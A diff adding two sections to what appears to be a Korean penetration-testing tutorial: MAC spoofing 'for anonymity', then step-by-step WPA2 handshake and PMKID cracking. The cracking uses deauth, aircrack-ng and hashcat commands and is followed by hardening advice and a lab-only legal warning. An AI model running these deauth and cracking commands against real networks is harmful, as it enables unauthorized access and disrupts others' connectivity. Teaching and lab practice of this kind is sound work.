@@ -365,5 +365,90 @@ iwconfig
 # TP-Link TL-WN722N v1 (저렴, 주입 지원)
 ```
 
+---
+
+## 8. MAC 주소 스푸핑 (익명성 확보)
+
+### MAC 주소 변경 이유와 방법
+```bash
+# MAC 주소란?
+# 네트워크 인터페이스에 하드웨어 수준으로 부여된 고유 식별자
+# 패킷이 올바른 장치에 전달될 수 있도록 사용
+# 네트워크 로그에 MAC 주소 기록 → 추적 가능
+
+# macchanger로 MAC 주소 변경 (Kali 내장)
+sudo ifconfig wlan0 down                  # 인터페이스 비활성화
+sudo macchanger --random wlan0            # 랜덤 MAC 설정
+sudo macchanger -m AA:BB:CC:DD:EE:FF wlan0  # 특정 MAC으로 변경
+sudo ifconfig wlan0 up                    # 인터페이스 재활성화
+
+# 변경 확인
+macchanger --show wlan0
+# Permanent MAC: 기존 하드웨어 MAC
+# Current MAC: 현재 사용 중인 (변경된) MAC
+
+# ip 명령으로 변경 (현대적 방법)
+sudo ip link set wlan0 down
+sudo ip link set wlan0 address AA:BB:CC:DD:EE:FF
+sudo ip link set wlan0 up
+```
+
+---
+
+## 9. WPA2 크랙 실전 — 핸드셰이크 수집부터 크랙까지
+
+### 단계별 전체 흐름
+```bash
+# 1단계: 모니터 모드 활성화 + MAC 변경
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+# → wlan0mon 생성
+
+# 2단계: 타겟 AP 스캔
+sudo airodump-ng wlan0mon
+# BSSID와 CH(채널) 기록
+
+# 3단계: 핸드셰이크 캡처
+sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 --write capture wlan0mon
+
+# 4단계: (다른 터미널) Deauth로 재연결 유도
+sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
+# → 클라이언트 재연결 시 핸드셰이크 캡처됨
+# → airodump-ng 화면 우상단에 "WPA handshake: AA:BB:CC:DD:EE:FF" 표시
+
+# 5단계: 핸드셰이크 크랙
+aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
+# 또는 hashcat으로 GPU 가속 크랙
+hcxtools/hcxpcapngtool -o hash.hc22000 capture-01.cap
+hashcat -a 0 -m 22000 hash.hc22000 wordlist.txt
+```
+
+### PMKID 공격 (클라이언트 없이 크랙 — 2018)
+```bash
+# 클라이언트가 연결되지 않아도 AP의 PMKID 수집 가능
+# hcxdumptool 사용
+
+sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
+
+# PMKID 추출
+hcxtools/hcxpcapngtool -o hash.hc22000 pmkid.pcapng
+
+# hashcat으로 크랙 (22000 = WPA-PMKID-PBKDF2)
+hashcat -a 0 -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
+hashcat -a 3 -m 22000 hash.hc22000 ?d?d?d?d?d?d?d?d  # 8자리 숫자 브루트포스
+```
+
+### 네트워크 보안 강화 권고 (방어 관점)
+```
+WPA2 / WPA3 보안 강화:
+  1. 강력한 비밀번호 설정 (20자 이상, 대소문자+숫자+특수문자)
+  2. WPA3 SAE 모드 사용 (Dragonfly 핸드셰이크 — 오프라인 딕셔너리 공격 방지)
+  3. WPS 비활성화 (PIN 브루트포스 취약)
+  4. PMF (Protected Management Frames) 활성화 — Deauth 공격 방어
+  5. 802.1X Enterprise 인증 사용 (기업 환경)
+  6. SSID 숨김은 무의미 (Probe Request로 탐지 가능)
+  7. MAC 필터링은 MAC 스푸핑으로 우회 가능 → 단독 방어 수단 부적절
+```
+
 > **실습 환경에서만 수행하세요.**
 > Deauth 공격, Evil Twin은 타인의 네트워크에 수행 시 전파법 위반입니다.
